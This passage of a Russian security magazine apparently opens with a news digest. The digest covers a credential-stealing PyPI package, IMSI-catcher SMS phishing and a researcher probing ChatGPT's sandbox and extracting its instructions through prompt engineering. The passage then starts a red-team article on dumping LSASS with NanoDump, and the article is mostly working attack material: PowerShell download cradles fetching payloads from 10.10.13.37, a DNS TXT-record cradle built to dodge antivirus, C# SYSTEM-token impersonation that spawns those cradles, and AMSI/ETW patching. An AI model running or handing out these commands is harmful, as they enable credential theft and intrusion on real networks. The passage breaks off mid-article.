        нер  (Gil  Lainer), вице‑президент NSO Group по  глобальным ком-
         муникациям. — Мы уверены, что отстоим в суде эти и многие другие
          утверждения, сделанные в прошлом, и с нетерпением ждем этой воз-
          можности».                 »





  УЖЕ ВСЕ УТЕКЛО
    Заместитель председателя правления Сбербанка Станислав Кузнецов рассказал, что, по оцен‐
   кам Сбера, в открытом доступе находятся около 3,5 миллиарда строк с персональными дан‐
   ными россиян, то есть информация примерно о 90% взрослых граждан России.
      По данным анализа, проведенного по итогам 2023 года в начале 2024 года, основным
   источником утечек являются интернет‑магазины и медицинские учреждения. По словам Куз‐
   нецова, информация в основном утекает не из кредитных организаций, как принято считать:
   на них приходится лишь около 2% утечек.

              «Ситуация давно уже выглядит плачевной. По нашим данным, около 3,5 мил‐ →           лиарда строк находятся в открытом доступе. Уже где‑то около 90% взрослого
           населения, к сожалению, в той или иной части какие‑то персональные данные
          имеют в открытом доступе»,— заявил Кузнецов.





 МАЛВАРЬ В PYPI
  В Python Package Index (PyPI) нашли вредоносный пакет, который незаметно
  похищал учетные данные Amazon Web Services (AWS) у разработчиков. Пакет
   оставался незамеченным около трех лет, и за это время его успели загрузить
  тысячи раз.
      Вредоносный пакет назывался Fabrice (уже удален из  PyPI), то есть
  с помощью тайпсквоттинга маскировался под популярную Python-библиотеку
   Fabric, предназначенную для удаленного выполнения шелл‑команд через
  SSH.
      Тогда как легитимный пакет насчитывает более 202 миллионов загрузок,
  его вредоносный аналог, опубликованный еще в марте 2021 года, был скачан
  более 37 100 раз.
     Как рассказали исследователи из ИБ‑компании Socket, Fabrice содержал
   «полезные нагрузки, которые похищают учетные данные, создают бэкдоры
  и выполняют предназначенные для определенных платформ скрипты».


          «Fabrice выполняет вредоносные действия в зависимости от операци-
        онной системы, в которой установлен. На Linux-машинах он исполь- «
         зует  специальную  функциональность для  загрузки,  декодирования
        и выполнения четырех различных shell-скриптов с внешнего сервера
          (89.44.9[.]227), — пишут специалисты. — В системах под управлением
        Windows извлекаются и выполняются две разные полезные нагрузки:
         скрипт p.vbs и Python-скрипт, причем первый также запускает скрытый
         Python-скрипт (d.py), хранящийся в папке Downloads».                 »
   Упомянутый VBScript работал как лаунчер, позволяя Python-скрипту выпол‐
   нять команды или задействовать дальнейшую полезную нагрузку. Другой
   Python-скрипт предназначался для загрузки с упомянутого удаленного сер‐
  вера  вредоносного  исполняемого  файла,  сохранения его под именем
  chrome.exe в папке Downloads, закрепления в системе с помощью зап‐
   ланированных задач (для запуска бинарника каждые 15 минут) и удаления
   файла d.py в конце.
      Конечной целью этой малвари, вне зависимости от операционной сис‐
  темы, была кража учетных данных: сбор ключей от AWS с помощью Boto3 AWS
   Software Development Kit (SDK) для Python и передача собранной информа‐
  ции на управляющий сервер злоумышленников.


 80% ФЕЙКОВ ИМИТИРУЮТ ИЗВЕСТНЫЕ БРЕНДЫ

  В первом полугодии 2024 года специалисты FACCT зафиксировали заметный рост фишинговых
   ресурсов, использующих бренды известных финансовых организаций, — на 48,3% по срав‐
   нению с прошлым годом.

  В среднем каждый день злоумышленники создают под каждый бренд по 4 фишинговых ресур‐
   са.  Среди них 94%  предназначены для  кражи  данных  банковских  карт,  остальные —
   для хищения учетных данных от аккаунта клиента.

  В основном хакеры нацелены на финансовый сектор и сферу электронной коммерции.





                                        Продолжение статьи →
← Начало статьи





 ФУРГОН ДЛЯ СПАМА
   Полиция Таиланда обнаружила принадлежавший мошенникам фургон и арес‐
  товала его  водителя  (35-летнего гражданина  Китая) за использование
   устройства для массовой рассылки фишинговых SMS-сообщений, адре‐
   сованных жителям Бангкока.
      Сообщается, что устройство, радиус действия которого составлял около
   трех километров, могло рассылать сообщения со скоростью 100 тысяч каж‐
  дый час. По данным следствия, за три дня мошенники отправили почти мил‐
  лион SMS-сообщений, которые гласили: «Срок действия ваших 9268 баллов
   истекает! Поспешите воспользоваться подарком прямо сейчас».
     Эти сообщения содержали  ссылку на фишинговый сайт со  строкой
   «aisthailand» в названии, то есть ресурс выдавали за сайт Advanced Info
   Service (AIS) — крупнейшего оператора мобильной связи в Таиланде.
      Пользователи, перешедшие по такой фишинговой  ссылке, попадали
  на страницу, где у них запрашивали информацию о банковской карте. Эти
   данные  в  итоге  попадали  в  руки  злоумышленников и  использовались
  для совершения несанкционированных транзакций в других странах.
      Специалисты AIS помогли полиции установить местонахождение устрой‐
   ства для массовой рассылки SMS. Однако оператор связи не разглашает
   никаких подробностей о том, как именно это было сделано.
      Известно, что участники мошеннической группы, часть из которых находи‐
  лась в Таиланде, а часть — в других странах, координировали свои действия
  через закрытые Telegram-каналы, где также придумывали тексты для мошен‐
   нических SMS.
      Теперь, помимо уже арестованного водителя фургона с оборудованием
  для массовой рассылки сообщений, полиция разыскивает еще как минимум
   двух участников группировки.
      Подобные  атаки возможны  благодаря  давно известным  уязвимостям
   в стандартах мобильной связи. В частности, требуется, чтобы мобильные
   устройства аутентифицировали себя в сетях посредством IMSI, но при этом
  сети не обязаны аутентифицировать себя в ответ.
    В итоге устройства, подключившиеся к фальшивой базовой станции, почти
   сразу могут получить фишинговое сообщение.
      Эмуляторы базовых  станций, через которые обычно  осуществляется
   перехват   соединений,   называют   IMSI-перехватчиками   (IMSI-catcher)
  или Stingray. По сути, это устройство, которое маскируется под вышку сотовой
   связи, заставляя устройства в зоне досягаемости подключаться именно
   к нему. IMSI-перехватчики нередко используются и самими правоохранитель‐
  ными органами для триангуляции целевых устройств, а иногда и для перех‐
   вата их коммуникаций.
      Отметим, что похожий случай произошел в декабре 2022 года, когда
   французская  полиция  обнаружила  IMSI-перехватчик,  который  женщина
  возила с собой по Парижу. С помощью этого устройства распространялись
   сообщения, призывающие парижан  делиться своими личными данными
  на фейковом сайте медицинского страхования. Как выяснилось позже, та же
   группировка была связана с другим IMSI-перехватчиком, который перевозили
  по городу в старой машине скорой помощи.


 УЯЗВИМЫЕ ГНСС

   Специалисты «Лаборатории Касперского» изучили оборудование глобальных навигационных
   спутниковых систем (ГНСС), которое используется в разных отраслях по всему миру: GPS
   (США), ГЛОНАСС (Россия), Galileo (Евросоюз), BeiDou Navigation Satellite System (BDS, Китай)
   и так далее.

   По состоянию на ноябрь 2024 года было  обнаружено 4183  доступных через интернет
   ГНСС‑приемника, уязвимых для различных типов атак.





                            Топ-5 производителей уязвимых ГНСС‑приемников

   Большинство уязвимых приемников принадлежат компаниям из отраслей телекоммуника-
  ций, облачных вычислений и энергетики.

   Чаще всего уязвимые экземпляры встречаются в Эквадоре (1129), Германии (648) и США
     (414).





   При этом большинство устройств работали под управлением Linux (как с открытым исходным
   кодом, так и проприетарных версий), но встречалась и Windows.


    Хуже того, обнаруженные устройства имели уязвимости, в том числе связанные с отказом
   в обслуживании, раскрытием информации, повышением привилегий и даже с внедрением
   и выполнением кода.





                          Топ-10 уязвимостей, обнаруженных в ГНСС‑приемниках





 ПЕСОЧНИЦА
 CHATGPT
   Специалист Mozilla 0Din (0Day Investigative Network) Марко Фигероа (Marco
   Figueroa) сумел получить широкий доступ к песочнице ChatGPT, включая воз‐
  можность загрузки и выполнения Python-скриптов, а также скачал плейбук
   (playbook) LLM.
      Песочница ChatGPT представляет собой изолированную среду, которая
   позволяет пользователям безопасно взаимодействовать с ней, будучи изо‐
   лированной от других пользователей и хост‑серверов. Песочница ограничи‐
   вает доступ к важным файлам и папкам, блокирует доступ в интернет и ста‐
   рается ограничить потенциально вредоносные команды, которые могут при‐
   меняться для эксплуатации уязвимостей или попытки побега.
     Информация о доступе к песочнице ChatGPT ранее публиковалась дру‐
  гими исследователями, которые находили разные способы ее изучения.
   Однако Марко Фигероа зашел дальше своих предшественников. В своем
   отчете он демонстрирует сразу пять проблем, о которых он уже уведомил
   разработчиков OpenAI. По словам исследователя, компания проявила инте‐
  рес только к одной из них и не сообщила ничего о своих планах по исправ‐
  лению других.
     Все началось с того, что во время работы над неким Python-проектом
   в ChatGPT Фигероа получил ошибку «Каталог не найден» (Directory not found).
   После этого он начал разбираться в том, как пользователь ChatGPT может
   взаимодействовать с песочницей.
      Выяснилось, что среда предоставляет возможность загрузки и скачивания
   файлов, составления списков файлов и папок, загрузки программы и их
   запуска, выполнения Linux-команд и извлечения файлов, хранящихся в песоч‐
   нице.
      Используя такие команды, как ls и list files, исследователь сумел составить
   список всех каталогов основной файловой системы песочницы, включая
   /home/sandbox/.openai_internal/, который  содержал информацию о  кон‐
   фигурации и настройках. Стоит отметить, что сейчас нельзя получить доступ
   к некоторым важным папкам и файлам (например, /root и различным файлам
   вроде /etc/shadow).
      После этого Фигероа перешел к экспериментам по управлению файлами,
   обнаружив, что может загружать файлы в папку /mnt/data, а также скачивать
   файлы из любой доступной директории.
    В итоге специалист выяснил, что может загружать в песочницу кастомные
   Python-скрипты и выполнять их. Например, он загрузил простой скрипт,
  выводящий текст «Hello, World!», и выполнил его, после чего результат отоб‐
   разился на экране.





   Исследователь объясняет, что по юридическим причинам не пытался при‐
  менить откровенно вредоносные скрипты, которые могли бы использоваться
  для побега из песочницы и выполнения более опасных действий. При этом
   подчеркивается, что все описанные действия были ограничены рамками
   песочницы, а среда выглядела должным образом изолированной.
     Помимо прочего, Фигероа обнаружил, что с помощью промпт‑инжинирин‐
   га можно найти и скачать плейбук ChatGPT, в котором описано, как чат‑бот
   должен вести себя и отвечать на вопросы в целом, а также в рамках соз‐
  данных пользователем апплетов.
    По его словам, с одной стороны, доступ к плейбуку обеспечивает проз‐
  рачность и должен укреплять доверие пользователей, поскольку объясняет,
   как именно формируются ответы. Но с другой стороны, эта информация
  может использоваться для раскрытия данных, позволяющих обойти защиту.


         «Хотя прозрачность в вопросах инструкций полезна, она также может
          раскрывать структуру ответов модели, что в теории позволяет про- «
         извести реверс‑инжиниринг защиты и внедрить вредоносные пром-
         пты, — объясняет Фигероа. — Модели, в которых используются кон-
         фиденциальные  инструкции или  конфиденциальные  данные, могут
          подвергаться риску, если пользователи используют доступ для сбора
          проприетарных конфигураций и данных».                 »
   Хотя возможность взаимодействия с песочницей может быть осознанным
  шагом, который предусмотрели разработчики OpenAI, исследователь сом‐
   невается, что это было сделано намеренно. Дело в том, что такое взаимодей‐
  ствие может привести к функциональным проблемам для пользователей, так
   как перемещение файлов может повлечь за собой сбой.
     Кроме того, доступ к подробной информации о конфигурации может
  помочь злоумышленникам лучше понять, как работает ИИ‑инструмент и как
   обойти его защиту, вынудив генерировать вредоносный контент.
    При этом, согласно bug bounty программе OpenAI, выполнение кода
   в песочнице (даже если это позволяет извлекать конфигурации или манипу‐
   лировать внутренними инструкциями) не считается проблемой и не подходит
  для выплаты вознаграждения.
      Согласно рекомендациям  компании, любое выполнение Python-кода,
  которое  происходит  в  пределах  песочницы,   считается  намеренным
  и находится в пределах конструктивных параметров модели. То есть в ком‐
  пании уверены, что пользователи, взаимодействующие с этой Python-средой,
   будут воспринимать ее как замкнутое, безопасное пространство, которое
  не влияет на ИИ‑систему за пределами установленных рамок.
      Представители OpenAI никак не прокомментировали публикацию иссле‐
   дователя, но сообщили, что изучают поднятые Фигероа вопросы.


 25% КОДА В GOOGLE ПИШЕТСЯ С ПОМОЩЬЮ ИИ
  В третьем квартале 2024 года прибыль Alphabet выросла на 34%, поскольку материнская ком‐
   пания Google заявила о росте своего облачного бизнеса на фоне высокого спроса на вычис‐
   лительные и информационные услуги, используемые для обучения и запуска моделей генера‐
    тивного ИИ.


   Комментируя этот отчет, глава Google Сундар Пичаи заявил, что ИИ активно применяется
   и внутри компании «для улучшения кодерских процессов», что повышает производительность
   и эффективность.

   По словам Пичаи, на сегодня более 25% нового кода в Google генерируется ИИ, а затем про‐
   веряется и одобряется людьми. Это помогает инженерам компании «делать больше и работать
   быстрее».





 АВТОПЕРЕЗАГРУЗКА
 IPHONE
  В ноябре стало известно, что киберкриминалисты обеспокоены странным
  поведением  iPhone:  устройства  самостоятельно  перезагружаются, если
   какое‑то время не подключались к сети сотового оператора. В итоге иссле‐
   дователи подтвердили, что с релизом iOS 18.1 разработчики Apple добавили
   в ОС новую защитную функцию.
     Все началось с того, что в распоряжении издания 404 Media оказался до‐
  кумент, в котором  правоохранители  предупреждали  коллег о странном
   поведении iPhone, хранящихся в ожидании проведения экспертизы. Спе‐
   циалисты писали, что теперь устройства могут перезагружаться самос‐
   тоятельно,  а  это  значительно  усложняет  последующую  разблокировку
   телефонов, например конфискованных у преступников.
      Дело в том, что спонтанная перезагрузка переводит устройство из режима
   «после первой разблокировки» (After First Unlock, AFU) в режим «до первой
   разблокировки» (Before First Unlock, BFU), а это существенно затрудняет пос‐
  ледующий взлом девайса с помощью имеющихся у криминалистов инстру‐
   ментов.
    BFU делает извлечение данных практически невозможным,  поскольку
  даже сама ОС больше не может получить к ним доступ с использованием
   ключей шифрования, хранящихся в памяти.
      Представители Apple не ответили на вопросы журналистов о том, действи‐
   тельно ли в iOS 18 появилась некая новая защита, из‑за которой устройства
   могут перезагружаться сами по себе, тем самым осложняя работу экспертов.
      Однако странными перезагрузками заинтересовались ИБ‑специалисты.
  Одной из них была Джиска Классен (Jiska Classen) из института имени Хассо
   Платтнера, которой удалось обнаружить, что в iOS действительно появилась
  новая защита. Но работает функция не совсем так, как предположили пра‐
   воохранители.

         «Apple добавила в iOS 18.1 функцию  inactivity reboot (перезагрузка
        при бездействии). Она реализована в keybagd и расширении ядра «
         AppleSEPKeyStore, — сообщала Классен. — Похоже, это никак не свя-
         зано с состоянием телефона / беспроводной сети. Хранилище ключей
          используется при разблокировке устройства. Поэтому если вы не раз-
          блокируете свой iPhone в течение некоторого времени... он перезаг-
           рузится!»                 »
  Как объяснили разработчики GrapheneOS, на устройствах под управлением
  iOS все данные шифруются с помощью ключа шифрования, созданного
  при первой установке или настройке операционной системы. Когда iPhone
   разблокируется с помощью PIN-кода или биометрических данных, ОС заг‐
   ружает ключи шифрования в память.
      После этого, если необходимо получить доступ к файлу, он автоматически
   расшифровывается с помощью этих ключей. Однако после перезагрузки
   iPhone переходит в состояние «покоя», то есть больше не хранит ключи шиф‐
  рования в памяти, и расшифровать данные становится практически невоз‐
  можно.
    По информации создателей GrapheneOS, в iOS 18.1 используется спе‐
   циальный таймер, который перезагружает устройство после четырех дней
   простоя.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Ghost Tap использует NFC для кражи денег


   Вредоносные коммиты с бэкдорами обнаружили на GitHub


  В qBittorrent исправили уязвимость 14-летней давности


   APT28 взломала компанию в соседнем здании, чтобы добраться до целевого Wi-Fi


  В Spotify нашли рекламу пиратского софта и читерского ПО


   РКН запретил распространять научную и статистическую информацию о VPN


    Ботнет Ngioweb использовал тысячи устройств в качестве резидентных прокси


   Самым популярным паролем в 2024 году остается 123456


  В Google Play нашли трояны, скачанные более 2,1 миллиона раз


  В Канаде арестован подозреваемый во взломе компании Snowflake
COVERSTORY





В этой статье подробно разберем скрытое
применение утилиты NanoDump из памяти,
когда   моделируемый    злоумышленник
не обладает «маячком» C&C на атакуемом
сетевом  узле, и  сравним такой  способ         sn🥶vvcr💥sh                                                                                                               Sr. Penetration Tester, Red
использования NanoDump с применением            Team Operator                                                                                                 ppn.snovvcrash.rocks
SafetyKatz.


Pentest Award
Этот текст получил первое место на премии Pentest Award 2024 в категории
«Раз bypass, два bypass». Это соревнование ежегодно проводится компанией
Awillix.


NanoDump уже успел обрести широкую популярность у вендоров AV/EDR, что
поспособствовало написанию для него кучи детектов, поэтому теперь мы
можем более  свободно  поделиться  своим  опытом его  использования
на «внутряках».


             INFO

                      Эта  заметка —  продолжение  темы,  начатой
                        в статье «Дампы LSASS для всех, даром, и пусть
                             никто не уйдет обиженный», в которой я показы‐
                          вал, как можно «по‑молодежному» вытаскивать
                          секреты  из  памяти   процесса  lsass.exe
                       для  повышения  привилегий  в  корпоративном
                     домене Active Directory или дальнейших боковых
                       перемещений в недра внутрянки заказчика пен‐
                          теста.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ВВОДНАЯ

Для начала немного поностальгируем по временам, когда деревья были
зеленее, а антивирусные решения не были так жестоки по отношению
к рядовым исполнителям проектов по тестированию на проникновение. В то
время (около пяти лет до момента написания статьи) в составе коллекции
GhostPack появился интересный инструмент SafetyKatz, в рамках разработки
которого исследователь @harmj0y вдохнул новую жизнь в небезызвестный
Mimikatz, уже на тот момент «палившийся» всем и вся при его использовании
в чистом виде.





SafetyKatz  декомпозирует  процесс  извлечения  данных  аутентификации
из LSASS на два этапа: непосредственное создание дампа с помощью API-
ручки dbghelp.dll!MiniDumpWriteDump и парсинг полученного дампа пос‐
редством  модифицированного  (уменьшенного по  своим  возможностям)
Mimikatz. Последний, в свою очередь, загружается в память по методу PE
Reflection и выполняет захардкоженные команды sekurlsa::logonpasswords
и sekurlsa::ekeys в отношении уже созданного ранее дампа памяти.
По завершении работы утилиты привнесенные артефакты — минидамп, сох‐
раненный по пути C:\Windows\Temp\debug.bin, — удаляются с файловой
системы жертвы.





                    Описание SafetyKatz (github.com)

Такой подход в свое время позволял уменьшить количество детектов исполь‐
зования sekurlsa::logonpasswords «на живую», сокращал время на выдер‐
гивание хешей и ключей (немалый дамп памяти больше не нужно тащить
к себе на тачку) и прятал сигнатуру Mimikatz от статического анализа. При‐
мерно такой же подход долгое время применялся моей командой с тем лишь
отличием, что я использовал новомодный NanoDump из памяти для создания
слепка памяти и библиотеку на C# — для его парсинга на месте.
   Дальше мы рассмотрим поподробнее, как создать свой «SafetyNDump»
для фана и профита, но сперва ознакомимся со вспомогательным инстру‐
ментарием.


             INFO

                           Сразу оговорюсь, что далее не будут рассмот‐
                     рены действующие на момент написания статьи
                           техники обхода AV/EDR для дампа LSASS. Цель
                         публикации — рассказать, как мы долгое время
                           «абьюзили» одну из лазеек уклонения от «Каспер‐
                              ского», и тем самым поделиться своим опытом
                        с коллегами, играющими на стороне дефенса.
                     На данный момент описываемый вектор  атаки
                            закрыт.



SYSTEM.REFLECTION.ASSEMBLY. КОРОЛЬ УМЕР, ДА ЗДРАВСТВУЕТ
КОРОЛЬ!

Мне очень нравится PowerShell и его возможности в контексте наступатель‐
ной безопасности. В случае, когда в целевой инфраструктуре не зажжен
AppLocker + Constrained Language Mode, простота применения этого инстру‐
мента Windows-автоматизации на обычных пентестах — просто подарок
для моделируемого злоумышленника. На киберучениях с необходимостью
скрытого исполнения команд его тоже можно приспособить под нужды
исполнителя  с  помощью  патчинга ETW,  вызова  ранспейса  System.
Management.Automation напрямую (я смотрю на тебя, PowerShx!) и других
триксов.
  Мы будем целиться в исполнение накрафченного на C# кода через
механизм  System.Reflection.Assembly,  что  поможет  еще  больше
упростить жизнь этичному злоумышленнику при подключении к сетевым
узлам через службу WinRM (Windows Remote Management) или, например,
с помощью скриптов exec.py из Impacket.
  На просторах интернета есть куча материалов, как выполнять код на «шар‐
пах» через PowerShell, но мне, как обычно, не хватало а‑в-т‑о-м‑а-т‑и-з‑а-
ц‑и-и... Поэтому в свободное от работы время я написал простую питонячью
утилиту bin2pwsh, которая  позволяет  конвертировать собранные на C#
бинари в лаунчеры на PowerShell.





              Я даже лого сделал, ага (с logoly.pro)

Кратко опишу ее возможности:
 • Автоматически создает «запускаторы» на PowerShell из скомпилированных
   исполняемых файлов на C# на основе предопределенных шаблонов (клас‐
   сический или с использованием примитивов Emit). Байты исполняемых
   файлов   сперва   сжимаются  с  помощью   zlib  и   оборачиваются
   в Base64 для их встраивания в код скриптов .ps1.
 • Можно использовать безумно крутой инструмент Donut, если нужно запус‐
   кать неуправляемый код из PowerShell для системных вызовов — прямых
    (форк Donut от @s4ntiago_p для Linux) или непрямых (закрытый форк Donut
   от @KlezVirus и Porchetta Industries для Windows с возможностью перехе‐
   ширования на лету). Само исполнение неуправляемого кода достигается
   за счет предварительной кросс‑компиляции в Linux (с помощью Mono)
   или обычной компиляции в Windows (с помощью csc.exe) селф‑инжектора
   на C# на основе темплейтов от @bohops (Unmanaged Code Execution with
   .NET Dynamic PInvoke) и @dr4k0nia (HInvoke and avoiding PInvoke). Они
   работают без статических импортов P/Invoke для вызовов WinAPI.
 • Позволяет применять несложные техники уклонения от AV: патчинг AMSI,
   ETW,  RC4-шифрование  полезной  нагрузки  с помощью  встроенных
   механизмов Windows и обфускацию статических строк.

Рассмотрим примеры использования.


ПРИМЕР 1. БАЗОВЫЙ

Это простая упаковка Rubeus в PowerShell-лаунчер на основе стандартного
шаблона System.Reflection.Assembly.


curl -sSL https://github.com/Flangvik/SharpCollection/raw/master/
NetFramework_4.0_Any/Rubeus.exe -o Rubeus.exe
bin2pwsh.py Rubeus.exe





                  Генерация загрузчика Rubeus на PowerShell


IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/
Invoke-Rubeus.ps1")


Invoke-Rubeus hash /domain:nightcity.net /user:snovvcrash /password:
Passw0rd!





                     Загрузка и запуск Rubeus из памяти


ПРИМЕР 2. ПРОДВИНУТЫЙ

Теперь посмотрим на продвинутую упаковку Rubeus в PowerShell-лаунчер
на основе шаблона System.Reflection.Emit и его исполнение через запуск
селф‑инжектора шелл‑кода, полученного с помощью форка Donut за авторс‐
твом  KlezVirus с динамическим перехешированием непрямых системных
вызовов (подробнее о технике рассказывает ролик на YouTube). Чаще всего
этот способ используется с нативным кодом, однако паковать таким образом
управляемый код также никто не запрещает.


curl -sSL https://github.com/Flangvik/SharpCollection/raw/master/
NetFramework_4.0_Any/Rubeus.exe -o Rubeus.exe


py .\bin2pwsh.py 'Rubeus.exe hash /domain:nightcity.net /user:
snovvcrash /password:Passw0rd!' -d -wh C:\Tools\SysWhispers3\
syswhispers.py -whm jumper_randomized --emit --debug --silent





                  Генерация загрузчика Rubeus на PowerShell


IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/
Invoke-RubeusInject.ps1")


Invoke-RubeusInject





                     Загрузка и запуск Rubeus из памяти


ПРИМЕР 3. POWERSHARPPACK СВОИМИ РУКАМИ

Ну и на сладкое — пример создания аналога репозитория PowerSharpPack
(от @ShitSecure) из SharpCollection (от @Flangvik) за считаные секунды.


git clone https://github.com/Flangvik/SharpCollection
cd SharpCollection/NetFramework_4.0_Any
for exe in ./* .exe; do bin2pwsh.py $exe --silent; done





             Делаем лаунчеры на PowerShell из SharpCollection


IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/
Invoke-Seatbelt.ps1")


Invoke-Seatbelt -group=system





                     Загрузка и запуск Seatbelt из памяти

Со вспомогательным  инструментарием разобрались, вернемся к нашей
проблеме. Чтобы оставаться организованными и во имя концепции «раз‐
деляй и властвуй», не будем отходить от нарратива декомпозиции SafetyKatz
и поочередно рассмотрим создание дампа и его парсинг.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

         НАНОДАМП
                КАК Я ЗАНОВО ИЗОБРЕЛ
            SAFETYKATZ ДЛЯ ДАМПА LSASS
                     С NANODUMP





ПИШЕМ SAFETYNDUMP. СОЗДАНИЕ ДАМПА LSASS В ОБХОД AV

Итак, первое, с чем нужно разобраться, — это создание дампа памяти
lsass.exe. Способ должен прокатить с действующим средством защиты.


Олицетворение SYSTEM из неинтерактивной консоли
На момент тестирования NanoDump при работе с «Касперским» стреляла
опция -eh/--elevate-handle, позаимствованная автором из этой презен‐
ташки. Основная идея заключается в открытии хендла к целевому процессу
с привилегиями PROCESS_QUERY_LIMITED_INFORMATION и последующем их
повышении до необходимых с помощью ntdll.dll!NtDuplicateObject.
Как я писал в предыдущей статье, один из способов блокировки доступа
к LSASS — сделать так, чтобы было невозможно получить привилегированный
дескриптор lsass.exe, и этот трюк позволяет обойти упомянутое ограниче‐
ние.
   Особенность использования опции -eh в том, что  нужно  запускать
NanoDump с привилегиями NT AUTHORITY\SYSTEM, что вносит дополнитель‐
ные трудности. Тащить на таргет PsExec? Создавать немедленную привиле‐
гированную задачу планировщика? Подменять сервисные бинари? Долго,
нудно и шумно.
  Я решил пойти по пути Token Impersonation (MITRE ATT&CK T1134.001)
и модифицировать утилиту tokenduplicator, которой часто пользуюсь как бес‐
файловой  альтернативой PsExec. Сперва посмотрим, как она работает
в исходном виде. Я клонирую репозиторий, соберу релиз и сделаю из него
PowerShell-лаунчер с помощью bin2pwsh.


git clone https://github.com/magnusstubman/tokenduplicator
cd .\tokenduplicator
devenv /build Release .\tokenduplicator.sln
cd .\tokenduplicator\bin\Release
py .\bin2pwsh.py .\tokenduplicator.exe





            Создаем PowerShell-лаунчер из tokenduplicator.exe

Загружаем в память и стягиваем токен у winlogon.exe, чтобы запустить шелл
с привилегиями системы.


IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/
Invoke-tokenduplicator.ps1")


Invoke-tokenduplicator winlogon cmd





                Использование «ванильного» tokenduplicator

Все выглядит отлично, за исключением одного но: работать это будет только
из интерактивного шелла.





           Провал использования tokenduplicator через Evil-WinRM

Если вспомнить, чему нас учил OSEP, станет понятно, что, если мы хотим
запустить CreateProcessWithTokenW из неинтерактивной сессии, нужно поп‐
равить    параметры    окружения   dwLogonFlags,   dwCreationFlags,
lpEnvironment  и  lpCurrentDirectory,   установленные  по   дефолту
в tokenduplicator. Без этих опций запущенный процесс тут же крашнется, так
как у аккаунта SYSTEM (который мы олицетворяем) не будет корректно задан‐
ного сеанса входа.





              Запуск CreateProcessWithTokenW в tokenduplicator

Я убрал  лишний  информационный  вывод, и  у меня  получился  такой
TokenDuplicator.Program.Main:


public static void Main()
{
  Process[] processes = Process.GetProcessesByName("winlogon");
  IntPtr hProcess = processes[0].Handle;


  OpenProcessToken(
    hProcess,
    0x0002,   // TOKEN_DUPLICATE
    out IntPtr hToken);


  DuplicateTokenEx(
    hToken,
    0xF01FF,  // TOKEN_ALL_ACCESS
    IntPtr.Zero,
    2,    // SecurityImpersonation
    1,    // TokenPrimary
    out IntPtr hDupToken);


  CreateEnvironmentBlock(out IntPtr lpEnvironment, hToken, false);
  STARTUPINFO si = new STARTUPINFO();
  si.cb = Marshal.SizeOf( si);
  si.lpDesktop = @"WinSta0\Default";
  StringBuilder sbSystemDir = new StringBuilder( 256);
  GetSystemDirectory(sbSystemDir, 256);


  CreateProcessWithTokenW(
    hDupToken,
    1,    // LOGON_WITH_PROFILE
    null,
    "powershell iex(new-object net.webclient).downloadstring(
""""http://10.10.13.37/cradle.ps1"""")" ,
    0x400,  // CREATE_UNICODE_ENVIRONMENT
    lpEnvironment,
    sbSystemDir.ToString() ,
    ref si,
    out PROCESS_INFORMATION _);
}

Теперь при запуске Invoke-TokenDuplicator из Evil-WinRM мы успешно
добиваемся исполнения команды на PowerShell, причем без отображения
всплывающего окна интерпретатора у залогиненного пользователя. Да, мы
не захватываем вывод исполняемой команды, но это нам и не сильно надо.





                              Есть контакт


SAFETYNDUMP.NET.WEBCLIENT ИЛИ RESOLVE-DNSNAME?

Чтобы уложиться в 1024 символа, отведенные на аргумент lpCommandLine
функции CreateProcessWithTokenW, нам хочешь не хочешь придется исполь‐
зовать загрузочный кредл, чтобы вытянуть и исполнить внешний скрипт
на PowerShell, содержащий NanoDump, из которого мы предварительно сде‐
лаем лаунчер с помощью bin2pwsh и Donut.
   Однако здесь снова на пути могут встать антивирусные решения, которым
обычно очень не нравится, когда нечто вроде IEX (IWR http://...) переда‐
ется строкой в те места, где происходит спаун процесса (будь то создание
объектов  класса Win32_Process через WMI, старт задач планировщика
или взаимодействие с Windows API).
  На помощь приходит старый трюк с резолвом TXT-записи подконтроль‐
ного доменного имени и его последующий пайп в Invoke-Expression. Этим
ходом мы уклоняемся от анализа строковых артефактов загрузки и исполне‐
ния «чего‑то непонятного», что ожидаемо станет триггером для AV. Осоз‐
нание того, что это сработает на нашем любимом антивирусе, пришло после
экспериментов с запуском PowerShell через wmiexec.py.





                   Обсуждение находки в рабочем чатике





              Заблюренное изображение из обсуждения выше

В целом, я думаю, идея ясна: идем в настройки своего домена и делаем при‐
мерно так, как на рисунке ниже.





                                Настройки DNS

После этого можем передавать URL, с которого надо грузить полезную наг‐
рузку, следующим образом в IEX:


$url="http://10.10.13.37/payload.txt"
IEX(Resolve-DnsName "cradle.contoso.com" 16).Strings[0]





        И никаких тебе Net.WebClient или Invoke-WebRequest!

С учетом этого трюка теперь наш код для спауна нового процесса с кредлом
будет выглядеть так:


CreateProcessWithTokenW(
    hDupToken,
    1, // LOGON_WITH_PROFILE
    null,
    $"powershell $url=""""{args[0]}"""";IEX(Resolve-DnsName
""""cradle.contoso.com"""" 16).Strings[0]",
    0x400, // CREATE_UNICODE_ENVIRONMENT
    lpEnvironment,
    sbSystemDir.ToString(),
    ref si,
    out PROCESS_INFORMATION _);

Теперь  все, что  осталось  сделать для  первой  части  (создания  дампа
LSASS), — это слепить лаунчер на PowerShell для NanoDump и убедиться, что
все работает.


curl -sSL https://github.com/helpsystems/nanodump/raw/main/dist/
nanodump.x64.exe -o nanodump.exe
bin2pwsh.py 'nanodump.exe -w C:\Windows\Temp\debug.bin -eh' --donut
--debug
# Вытаскиваем содержимое тела функции в сырой скрипт, который
выполнится сразу после IEX
vim Invoke-nanodumpInject.ps1


IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/
Invoke-TokenDuplicator.ps1")


Invoke-TokenDuplicator http://10.10.13.37/Invoke-nanodumpInject.ps1


Get-Item C:\Windows\Temp\debug.bin





                       Норм, пока работает

Не будем отходить от плана и перейдем ко второму таску — парсингу соз‐
данного дампа on-site.


ПИШЕМ SAFETYNDUMP

Парсинг MiniDump
Главная проблема, которая, на мой взгляд, поспособствовала созданию
